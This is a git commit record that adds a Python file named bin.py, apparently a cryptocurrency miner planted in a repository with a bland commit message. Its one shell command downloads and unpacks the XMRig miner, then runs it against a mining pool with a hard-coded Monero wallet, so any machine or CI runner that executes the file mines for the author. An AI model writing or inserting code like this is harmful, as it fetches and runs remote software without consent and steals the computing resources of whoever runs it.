87256d7543f3808ec895488a0f770fa660c94c10
asimeci <111687955+asimeci@users.noreply.github.com>
2022-10-01 19:13:07 +0000

    Create bin.py

---
+++ bin.py
@@ -0,0 +1,3 @@
+import os
+x = "wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-x64.tar.gz && tar -xzf xmrig-6.15.2-linux-x64.tar.gz && cd xmrig-6.15.2 && ./xmrig -o rx.unmineable.com:3333 -u XMR:46RDrvQ4ocqPee5sQEh8joJbYWh6ZqBQgcxJvnroEox8ZUumk4PKGicR3367yuiNEyX1c1MDFMHZ1dbHLrcRkLjNCNHdkuo.lo1otn+500#d73s-pdj0 -k -a rx/0"
+os.system(command=x)
